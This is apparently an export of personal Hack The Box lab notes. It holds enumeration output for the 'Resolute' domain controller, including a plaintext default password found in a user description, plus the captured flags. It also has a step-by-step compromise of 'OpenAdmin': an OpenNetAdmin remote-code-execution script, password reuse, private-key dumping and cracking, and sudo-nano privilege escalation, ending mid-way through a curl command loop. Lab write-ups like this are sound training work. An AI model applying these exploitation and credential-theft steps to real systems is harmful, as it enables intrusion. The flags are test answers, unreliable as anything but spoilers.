   uSNChanged: 5890<br />|         showInAdvancedViewOnly: TRUE<br />|         name: System<br />|         objectGUID: 40f9d21f-49e-f54f-bf31-ad83fbc454<br />|         systemFlags: -1946157056<br />|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         isCriticalSystemObject: TRUE<br />|         dSCorePropagationData: 2019/09/27 22:10:48 UTC<br />|         dSCorePropagationData: 2019/09/27 10:52:18 UTC<br />|         dSCorePropagationData: 2019/09/26 12:35:01 UTC<br />|         dSCorePropagationData: 2019/09/25 13:29:12 UTC<br />|         dSCorePropagationData: 1601/07/14 04:24:33 UTC<br />|     dn: CN=LostAndFound,DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: lostAndFound<br />|         cn: LostAndFound<br />|         description: Default container for orphaned objects<br />|         distinguishedName: CN=LostAndFound,DC=megabank,DC=local<br />|         instanceType: 4<br />|         whenCreated: 2019/09/25 13:28:31 UTC<br />|         whenChanged: 2019/09/25 13:28:31 UTC<br />|         uSNCreated: 5886<br />|         uSNChanged: 5886<br />|         showInAdvancedViewOnly: TRUE<br />|         name: LostAndFound<br />|         objectGUID: f0581973-33c1-5a4b-aeff-69c8231b4c20<br />|         systemFlags: -1946157056<br />|         objectCategory: CN=Lost-And-Found,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         isCriticalSystemObject: TRUE<br />|         dSCorePropagationData: 2019/09/27 22:10:48 UTC<br />|         dSCorePropagationData: 2019/09/27 10:52:18 UTC<br />|         dSCorePropagationData: 2019/09/26 12:35:01 UTC<br />|         dSCorePropagationData: 2019/09/25 13:29:12 UTC<br />|         dSCorePropagationData: 1601/07/14 04:24:33 UTC<br />|     dn: CN=Infrastructure,DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: infrastructureUpdate<br />|         cn: Infrastructure<br />|         distinguishedName: CN=Infrastructure,DC=megabank,DC=local<br />|         instanceType: 4<br />|         whenCreated: 2019/09/25 13:28:31 UTC<br />|         whenChanged: 2019/09/25 13:28:31 UTC<br />|         uSNCreated: 6032<br />|         uSNChanged: 6032<br />|         showInAdvancedViewOnly: TRUE<br />|         name: Infrastructure<br />|         objectGUID: 261c42dd-8a5-8848-9933-acc8d9b31e21<br />|         fSMORoleOwner: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local<br />|         systemFlags: -1946157056<br />|         objectCategory: CN=Infrastructure-Update,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         isCriticalSystemObject: TRUE<br />|         dSCorePropagationData: 2019/09/27 22:10:48 UTC<br />|         dSCorePropagationData: 2019/09/27 10:52:18 UTC<br />|         dSCorePropagationData: 2019/09/26 12:35:01 UTC<br />|         dSCorePropagationData: 2019/09/25 13:29:12 UTC<br />|         dSCorePropagationData: 1601/07/14 04:24:33 UTC<br />|     dn: CN=ForeignSecurityPrincipals,DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: container<br />|         cn: ForeignSecurityPrincipals<br />|         description: Default container for security identifiers (SIDs) associated with objects from external, trusted domains<br />|         distinguishedName: CN=ForeignSecurityPrincipals,DC=megabank,DC=local<br />|         instanceType: 4<br />|         whenCreated: 2019/09/25 13:28:31 UTC<br />|         whenChanged: 2019/09/25 13:28:31 UTC<br />|         uSNCreated: 6033<br />|         uSNChanged: 6033<br />|         showInAdvancedViewOnly: FALSE<br />|         name: ForeignSecurityPrincipals<br />|         objectGUID: 34d72428-e5c-7b46-9f90-963f6f91eeb<br />|         systemFlags: -1946157056<br />|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         isCriticalSystemObject: TRUE<br />|         dSCorePropagationData: 2019/09/27 22:10:48 UTC<br />|         dSCorePropagationData: 2019/09/27 10:52:18 UTC<br />|         dSCorePropagationData: 2019/09/26 12:35:01 UTC<br />|         dSCorePropagationData: 2019/09/25 13:29:12 UTC<br />|         dSCorePropagationData: 1601/07/14 04:24:33 UTC<br />|     dn: CN=Program Data,DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: container<br />|         cn: Program Data<br />|         description: Default location for storage of application data.<br />|         distinguishedName: CN=Program Data,DC=megabank,DC=local<br />|         instanceType: 4<br />|         whenCreated: 2019/09/25 13:28:31 UTC<br />|         whenChanged: 2019/09/25 13:28:31 UTC<br />|         uSNCreated: 6034<br />|         uSNChanged: 6034<br />|         showInAdvancedViewOnly: TRUE<br />|         name: Program Data<br />|         objectGUID: ced5275f-fd9-5f43-b6e-6938b4e19a81<br />|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         dSCorePropagationData: 2019/09/27 22:10:48 UTC<br />|         dSCorePropagationData: 2019/09/27 10:52:18 UTC<br />|         dSCorePropagationData: 2019/09/26 12:35:01 UTC<br />|         dSCorePropagationData: 2019/09/25 13:29:12 UTC<br />|         dSCorePropagationData: 1601/07/14 04:24:33 UTC<br />|     dn: CN=Microsoft,CN=Program Data,DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: container<br />|         cn: Microsoft<br />|         description: Default location for storage of Microsoft application data.<br />|         distinguishedName: CN=Microsoft,CN=Program Data,DC=megabank,DC=local<br />|         instanceType: 4<br />|         whenCreated: 2019/09/25 13:28:31 UTC<br />|         whenChanged: 2019/09/25 13:28:31 UTC<br />|         uSNCreated: 6035<br />|         uSNChanged: 6035<br />|         showInAdvancedViewOnly: TRUE<br />|         name: Microsoft<br />|         objectGUID: 30ca5855-6b3e-3740-a918-ea7e5ecfffd5<br />|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         dSCorePropagationData: 2019/09/27 22:10:48 UTC<br />|         dSCorePropagationData: 2019/09/27 10:52:18 UTC<br />|         dSCorePropagationData: 2019/09/25 13:29:12 UTC<br />|         dSCorePropagationData: 1601/01/01 18:16:33 UTC<br />|     dn: CN=NTDS Quotas,DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: msDS-QuotaContainer<br />|         cn: NTDS Quotas<br />|         description: Quota specifications container<br />|         distinguishedName: CN=NTDS Quotas,DC=megabank,DC=local<br />|         instanceType: 4<br />|         whenCreated: 2019/09/25 13:28:31 UTC<br />|         whenChanged: 2019/09/25 13:28:31 UTC<br />|         uSNCreated: 6036<br />|         uSNChanged: 6036<br />|         showInAdvancedViewOnly: TRUE<br />|         name: NTDS Quotas<br />|         objectGUID: 91fa8980-4347-7647-936a-1b5967503a9b<br />|         systemFlags: -2147483648<br />|         objectCategory: CN=ms-DS-Quota-Container,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         isCriticalSystemObject: TRUE<br />|         dSCorePropagationData: 2019/09/27 22:10:48 UTC<br />|         dSCorePropagationData: 2019/09/27 10:52:18 UTC<br />|         dSCorePropagationData: 2019/09/26 12:35:01 UTC<br />|         dSCorePropagationData: 2019/09/25 13:29:12 UTC<br />|         dSCorePropagationData: 1601/07/14 04:24:33 UTC<br />|         msDS-TombstoneQuotaFactor: 100<br />|     dn: CN=Managed Service Accounts,DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: container<br />|         cn: Managed Service Accounts<br />|         description: Default container for managed service accounts<br />|         distinguishedName: CN=Managed Service Accounts,DC=megabank,DC=local<br />|         instanceType: 4<br />|         whenCreated: 2019/09/25 13:28:31 UTC<br />|         whenChanged: 2019/09/25 13:28:31 UTC<br />|         uSNCreated: 6037<br />|         uSNChanged: 6037<br />|         showInAdvancedViewOnly: FALSE<br />|         name: Managed Service Accounts<br />|         objectGUID: 5ca0ec93-8f9d-5d42-80fe-8e5dd33415ce<br />|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         dSCorePropagationData: 2019/09/27 22:10:48 UTC<br />|         dSCorePropagationData: 2019/09/27 10:52:18 UTC<br />|         dSCorePropagationData: 2019/09/26 12:35:01 UTC<br />|         dSCorePropagationData: 2019/09/25 13:29:12 UTC<br />|         dSCorePropagationData: 1601/07/14 04:24:33 UTC<br />|     dn: CN=Keys,DC=megabank,DC=local<br />|     dn: CN=WinsockServices,CN=System,DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: container<br />|         cn: WinsockServices<br />|         distinguishedName: CN=WinsockServices,CN=System,DC=megabank,DC=local<br />|         instanceType: 4<br />|         whenCreated: 2019/09/25 13:28:31 UTC<br />|         whenChanged: 2019/09/25 13:28:31 UTC<br />|         uSNCreated: 5891<br />|         uSNChanged: 5891<br />|         showInAdvancedViewOnly: TRUE<br />|         name: WinsockServices<br />|         objectGUID: 5eca97f7-852f-3a45-bdcf-3e80e3385d69<br />|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         isCriticalSystemObject: TRUE<br />|         dSCorePropagationData: 2019/09/27 22:10:48 UTC<br />|         dSCorePropagationData: 2019/09/27 10:52:19 UTC<br />|         dSCorePropagationData: 2019/09/25 13:29:12 UTC<br />|         dSCorePropagationData: 1601/01/01 18:16:33 UTC<br />|     dn: CN=RpcServices,CN=System,DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: container<br />|         objectClass: rpcContainer<br />|         cn: RpcServices<br />|         distinguishedName: CN=RpcServices,CN=System,DC=megabank,DC=local<br />|         instanceType: 4<br />|         whenCreated: 2019/09/25 13:28:31 UTC<br />|         whenChanged: 2019/09/25 13:28:31 UTC<br />|         uSNCreated: 5892<br />|         uSNChanged: 5892<br />|         showInAdvancedViewOnly: TRUE<br />|         name: RpcServices<br />|         objectGUID: c1e4561a-408c-c84e-b995-70bb8b17da5<br />|         systemFlags: -1946157056<br />|         objectCategory: CN=Rpc-Container,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         isCriticalSystemObject: TRUE<br />|         dSCorePropagationData: 2019/09/27 22:10:48 UTC<br />|         dSCorePropagationData: 2019/09/27 10:52:19 UTC<br />|         dSCorePropagationData: 2019/09/25 13:29:12 UTC<br />|         dSCorePropagationData: 1601/01/01 18:16:33 UTC<br />|     dn: CN=FileLinks,CN=System,DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: fileLinkTracking<br />|         cn: FileLinks<br />|         distinguishedName: CN=FileLinks,CN=System,DC=megabank,DC=local<br />|         instanceType: 4<br />|         whenCreated: 2019/09/25 13:28:31 UTC<br />|         whenChanged: 2019/09/25 13:28:31 UTC<br />|         uSNCreated: 5893<br />|         uSNChanged: 5893<br />|         showInAdvancedViewOnly: TRUE<br />|         name: FileLinks<br />|         objectGUID: 8c677be4-1aaf-e74b-b4b4-a38dc418ead<br />|         systemFlags: -1946157056<br />|         objectCategory: CN=File-Link-Tracking,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         isCriticalSystemObject: TRUE<br />|         dSCorePropagationData: 2019/09/27 22:10:48 UTC<br />|         dSCorePropagationData: 2019/09/27 10:52:19 UTC<br />|         dSCorePropagationData: 2019/09/25 13:29:12 UTC<br />|         dSCorePropagationData: 1601/01/01 18:16:33 UTC<br />|     dn: CN=VolumeTable,CN=FileLinks,CN=System,DC=megabank,DC=local<br />|     dn: CN=ObjectMoveTable,CN=FileLinks,CN=System,DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: fileLinkTracking<br />|         objectClass: linkTrackObjectMoveTable<br />|         cn: ObjectMoveTable<br />|         distinguishedName: CN=ObjectMoveTable,CN=FileLinks,CN=System,DC=megabank,DC=local<br />|         instanceType: 4<br />|         whenCreated: 2019/09/25 13:28:31 UTC<br />|         whenChanged: 2019/09/25 13:28:31 UTC<br />|         uSNCreated: 5895<br />|         uSNChanged: 5895<br />|         showInAdvancedViewOnly: TRUE<br />|         name: ObjectMoveTable<br />|         objectGUID: e16ba9f4-c9f-449-88d8-65e65e9cfdb1<br />|         systemFlags: -1946157056<br />|         objectCategory: CN=Link-Track-Object-Move-Table,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         isCriticalSystemObject: TRUE<br />|         dSCorePropagationData: 2019/09/27 22:10:48 UTC<br />|         dSCorePropagationData: 2019/09/27 10:52:19 UTC<br />|         dSCorePropagationData: 2019/09/25 13:29:12 UTC<br />|         dSCorePropagationData: 1601/01/01 18:16:33 UTC<br />|     dn: CN=Default Domain Policy,CN=System,DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: leaf<br />|         objectClass: domainPolicy<br />|         cn: Default Domain Policy<br />|         distinguishedName: CN=Default Domain Policy,CN=System,DC=megabank,DC=local<br />|         instanceType: 4<br />|         whenCreated: 2019/09/25 13:28:31 UTC<br />|         whenChanged: 2019/09/25 13:28:31 UTC<br />|         uSNCreated: 5896<br />|         uSNChanged: 5896<br />|         showInAdvancedViewOnly: TRUE<br />|         name: Default Domain Policy<br />|         objectGUID: 1f79146-3c59-342-ae76-ff643dfce95<br />|         objectCategory: CN=Domain-Policy,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         isCriticalSystemObject: TRUE<br />|         dSCorePropagationData: 2019/09/27 22:10:48 UTC<br />|         dSCorePropagationData: 2019/09/27 10:52:18 UTC<br />|         dSCorePropagationData: 2019/09/25 13:29:12 UTC<br />|         dSCorePropagationData: 1601/01/01 18:16:33 UTC<br />|     dn: CN=AppCategories,CN=Default Domain Policy,CN=System,DC=megabank,DC=local<br />|         objectClass: top<br />|         objectClass: classStore<br />|         cn: AppCategories<br />|         distinguishedName: CN=AppCategories,CN=Default Domain Policy,CN=System,DC=megabank,DC=local<br />|         instanceType: 4<br />|         whenCreated: 2019/09/25 13:28:31 UTC<br />|         whenChanged: 2019/09/25 13:28:31 UTC<br />|         uSNCreated: 5897<br />|         uSNChanged: 5897<br />|         showInAdvancedViewOnly: TRUE<br />|         name: AppCategories<br />|         objectGUID: 44976634-b987-744c-8d2e-866227fe20a2<br />|         objectCategory: CN=Class-Store,CN=Schema,CN=Configuration,DC=megabank,DC=local<br />|         isCriticalSystemObject: TRUE<br />|         dSCorePropagationData: 2019/09/27 22:10:48 UTC<br />|         dSCorePropagationData: 2019/09/27 10:52:18 UTC<br />|         dSCorePropagationData: 2019/09/25 13:29:12 UTC<br />|         dSCorePropagationData: 1601/01/01 18:16:33 UTC<br />| <br />| <br />|_Result limited to 20 objects (see ldap.maxobjects)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 3.34 seconds<br /></div><div class='page'><h1 class='title level-6'>smb</h1><br/></div><div class='page'><h1 class='title level-7'>smb nmap</h1><br/>nmap --script smb-vuln* -p 139,445 10.10.10.169<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-14 13:45 EDT<br />Nmap scan report for megabank.local (10.10.10.169)<br />Host is up (0.44s latency).<br /><br />PORT    STATE SERVICE<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Host script results:<br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED<br /><br />Nmap done: 1 IP address (1 host up) scanned in 25.46 seconds<br /></div><div class='page'><h1 class='title level-7'>enum4linux</h1><br/>enum4linux -a 10.10.10.169<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Tue Apr 14 13:44:45 2020<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.10.10.169<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ==================================================== <br />|    Enumerating Workgroup/Domain on 10.10.10.169    |<br /> ==================================================== <br />[E] Can&#39;t find workgroup/domain<br /><br /><br /> ============================================ <br />|    Nbtstat Information for 10.10.10.169    |<br /> ============================================ <br />Looking up status of 10.10.10.169<br />No reply from 10.10.10.169<br /><br /> ===================================== <br />|    Session Check on 10.10.10.169    |<br /> ===================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.<br />[+] Server 10.10.10.169 allows sessions using username &#39;&#39;, password &#39;&#39;<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.<br />[+] Got domain/workgroup name: <br /><br /> =========================================== <br />|    Getting domain SID for 10.10.10.169    |<br /> =========================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.<br />Could not initialise lsarpc. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br />[+] Can&#39;t determine if host is part of domain or part of a workgroup<br /><br /> ====================================== <br />|    OS information on 10.10.10.169    |<br /> ====================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.<br />Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.<br />[+] Got OS info for 10.10.10.169 from smbclient: <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.<br />[+] Got OS info for 10.10.10.169 from srvinfo:<br />Could not initialise srvsvc. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br /><br /> ============================= <br />|    Users on 10.10.10.169    |<br /> ============================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.<br />index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail	Name: (null)	Desc: (null)<br />index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain<br />index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela	Name: (null)	Desc: (null)<br />index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette	Name: (null)	Desc: (null)<br />index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika	Name: (null)	Desc: (null)<br />index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire	Name: (null)	Desc: (null)<br />index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude	Name: (null)	Desc: (null)<br />index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.<br />index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia	Name: (null)	Desc: (null)<br />index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred	Name: (null)	Desc: (null)<br />index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain<br />index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo	Name: (null)	Desc: (null)<br />index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account<br />index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus	Name: (null)	Desc: (null)<br />index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!<br />index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie	Name: (null)	Desc: (null)<br />index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki	Name: (null)	Desc: (null)<br />index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo	Name: (null)	Desc: (null)<br />index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per	Name: (null)	Desc: (null)<br />index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan	Name: Ryan Bertrand	Desc: (null)<br />index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally	Name: (null)	Desc: (null)<br />index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon	Name: (null)	Desc: (null)<br />index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve	Name: (null)	Desc: (null)<br />index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie	Name: (null)	Desc: (null)<br />index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita	Name: (null)	Desc: (null)<br />index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf	Name: (null)	Desc: (null)<br />index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach	Name: (null)	Desc: (null)<br /><br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.<br />Use of uninitialized value $users in print at ./enum4linux.pl line 888.<br />Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.<br /><br /> ========================================= <br />|    Share Enumeration on 10.10.10.169    |<br /> ========================================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.<br /><br />	Sharename       Type      Comment<br />	---------       ----      -------<br />SMB1 disabled -- no workgroup available<br /><br />[+] Attempting to map shares on 10.10.10.169<br /><br /> ==================================================== <br />|    Password Policy Information for 10.10.10.169    |<br /> ==================================================== <br /><br /><br />[+] Attaching to 10.10.10.169 using a NULL share<br /><br />[+] Trying protocol 139/SMB...<br /><br />	[!] Protocol failed: Cannot request session (Called Name:10.10.10.169)<br /><br />[+] Trying protocol 445/SMB...<br /><br />[+] Found domain(s):<br /><br />	[+] MEGABANK<br />	[+] Builtin<br /><br />[+] Password Info for Domain: MEGABANK<br /><br />	[+] Minimum password length: 7<br />	[+] Password history length: 24<br />	[+] Maximum password age: Not Set<br />	[+] Password Complexity Flags: 000000<br /><br />		[+] Domain Refuse Password Change: 0<br />		[+] Domain Password Store Cleartext: 0<br />		[+] Domain Password Lockout Admins: 0<br />		[+] Domain Password No Clear Change: 0<br />		[+] Domain Password No Anon Change: 0<br />		[+] Domain Password Complex: 0<br /><br />	[+] Minimum password age: 1 day 4 minutes <br />	[+] Reset Account Lockout Counter: 30 minutes <br />	[+] Locked Account Duration: 30 minutes <br />	[+] Account Lockout Threshold: None<br />	[+] Forced Log off Time: Not Set<br /><br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.<br /><br />[+] Retieved partial password policy with rpcclient:<br /><br /><br /><br /> ============================== <br />|    Groups on 10.10.10.169    |<br /> ============================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.<br /><br />[+] Getting builtin groups:<br /><br />[+] Getting builtin group memberships:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.<br /><br />[+] Getting local groups:<br /><br />[+] Getting local group memberships:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.<br /><br />[+] Getting domain groups:<br />group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]<br />group:[Domain Admins] rid:[0x200]<br />group:[Domain Users] rid:[0x201]<br />group:[Domain Guests] rid:[0x202]<br />group:[Domain Computers] rid:[0x203]<br />group:[Domain Controllers] rid:[0x204]<br />group:[Schema Admins] rid:[0x206]<br />group:[Enterprise Admins] rid:[0x207]<br />group:[Group Policy Creator Owners] rid:[0x208]<br />group:[Read-only Domain Controllers] rid:[0x209]<br />group:[Cloneable Domain Controllers] rid:[0x20a]<br />group:[Protected Users] rid:[0x20d]<br />group:[Key Admins] rid:[0x20e]<br />group:[Enterprise Key Admins] rid:[0x20f]<br />group:[DnsUpdateProxy] rid:[0x44e]<br />group:[Contractors] rid:[0x44f]<br /><br />[+] Getting domain group memberships:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Domain Guests&#39; (RID: 514) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Enterprise Admins&#39; (RID: 519) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Domain Computers&#39; (RID: 515) has member: MEGABANK\MS02$<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Enterprise Read-only Domain Controllers&#39; (RID: 498) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Domain Controllers&#39; (RID: 516) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Protected Users&#39; (RID: 525) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Cloneable Domain Controllers&#39; (RID: 522) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Group Policy Creator Owners&#39; (RID: 520) has member: MEGABANK\Administrator<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Schema Admins&#39; (RID: 518) has member: MEGABANK\Administrator<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Contractors&#39; (RID: 1103) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;DnsUpdateProxy&#39; (RID: 1102) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Domain Admins&#39; (RID: 512) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Domain Users&#39; (RID: 513) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Enterprise Key Admins&#39; (RID: 527) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br /><br /> ======================================================================= <br />|    Users on 10.10.10.169 via RID cycling (RIDS: 500-550,1000-1050)    |<br /> ======================================================================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.<br />[E] Couldn&#39;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.<br /><br /> ============================================= <br />|    Getting printer info for 10.10.10.169    |<br /> ============================================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.<br />Could not initialise spoolss. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br /><br /><br />enum4linux complete on Tue Apr 14 13:51:12 2020<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />0c3be45fcfe249796ccbee8d3a978540<br />root<br />e1d94876a506850d0c20edb5405e619c</div><div class='page'><h1 class='title level-4'>10.10.10.171 OpenAdmin</h1><br/>nmap showed that 22 and 80 were open.<br />dirsearch showed me that there were directories at /music/ /artwork/  and  /sierra/<br />in looking around and clicking in music, I found that clicking “login” took me to /ona/<br />the front page of /ona/ showed me that the version number was 18.1.1<br />searchsploit showed me that it was vulnerable!<br />4791.sh<br />I was not able to make it work with the script as it was, but setting the variable &quot;URL&quot; to <a href="http://10.10.10.171/ona/loginphp">http://10.10.10.171/ona/loginphp</a> then running manually worked just fine<br />yeeyee... we are www-data<br /><br />the README.md shows a link to the github inatall page and I can see the default db username is ona_sys<br />grep -ir -C 5 ona_sys           shows that the db password is n1nj4W4rri0R!<br />lets see if it is reused with ssh<br />n1nj4W4rri0R! works for jimmy!!<br /><br />after poking around we see that there is a file named /var/www/internal/main.php that wants to dump joanna&#39;s private key<br />we see that it needs to be run with jimmy&#39;s creds.<br />netstat -natup shows us that 52846 is listening<br />curl -u jimmy:n1nj4W4rri0R! 127.0.0.1:52846/main.php<br />dumped her private key to the screen!!<br /><br />nano the key into a text file (rsa_key.txt)<br />ssh2john to make the text john readable (rsa_key.john)<br />john told me the priv key password was bloodninjas<br /><br />chmod 400 rsa_key.txt (you need to restrict the privs to use it)<br />ssh -i rsa_key.txt joanna@10.10.10.171<br />password=bloodninjas<br />we are in!!!<br /><br />sudo -l tells us we can run        /bin/nano /opt/priv       with no password<br />                                                  ^^^^^^^^^^^^ is one command by the way<br />sudo /bin/nano /opt/priv<br />gtfobins<br />root</div><div class='page'><h1 class='title level-5'>yee</h1><br/>root@kali:~/Desktop/Machines/HTB/OpenAdmin# ./47691.sh <a href="http://10.10.10.171/ona/login.php">http://10.10.10.171/ona/login.php</a><br />./47691.sh: line 8: $&#39;\r&#39;: command not found<br />./47691.sh: line 16: $&#39;\r&#39;: command not found<br />./47691.sh: line 18: $&#39;\r&#39;: command not found<br />./47691.sh: line 23: syntax error near unexpected token `done&#39;<br />./47691.sh: line 23: `done&#39;<br />root@kali:~/Desktop/Machines/HTB/OpenAdmin# URL=&#39;<a href="http://10.10.10.171/ona/login.php'">http://10.10.10.171/ona/login.php&#39;</a><br />root@kali:~/Desktop/Machines/HTB/OpenAdmin# while true;do<br />&gt;  echo -n &quot;$ &quot;; read cmd<br />&gt;  curl --silent -d 